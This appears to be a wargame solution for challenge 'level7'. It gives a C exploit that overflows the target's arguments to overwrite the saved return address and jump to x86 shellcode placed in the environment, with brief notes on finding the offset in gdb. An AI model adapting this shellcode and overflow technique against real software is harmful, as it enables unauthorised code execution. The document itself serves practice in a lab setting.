#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define VULN "/var/challenge/level7/7"

char mc[] = "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6c\x33\x33\x74\x68\x69\x6e\x2f\x2f\x68\x61\x6c\x2f\x62\x68\x2f\x6c\x6f\x63\x68\x2f\x75\x73\x72\x89\xe3\xb0\x0b\xcd\x80";

int main()
{
	char *prm1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
	     *prm2 = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
	     *prm3 = "C1C2C3C4C5C6C7C8C\xb9\xff\xff\xbf" "2D";
	     char *prgwprm[] = {VULN, prm1, prm2, prm3, NULL};
	char *envp[] = {mc, NULL};

	execve(prgwprm[0], prgwprm, envp);
	return 0;
}

Steps:

In order to cause the buffer overflow, I would need 64 argv[1] and argv[2] inputs. 
I then needed to figure out how many argv[3] inputs would be required to overwrite seip in <seip>. 
This was done through a joint effort of maths and trial and error, using ~20 bytes in argv[3] and notating them (C1C2...) to find out which bytes were overwriting seip â€“ in gdb.
An adapted exploit6 program was used to insert the shellcode as an environment parameter. 
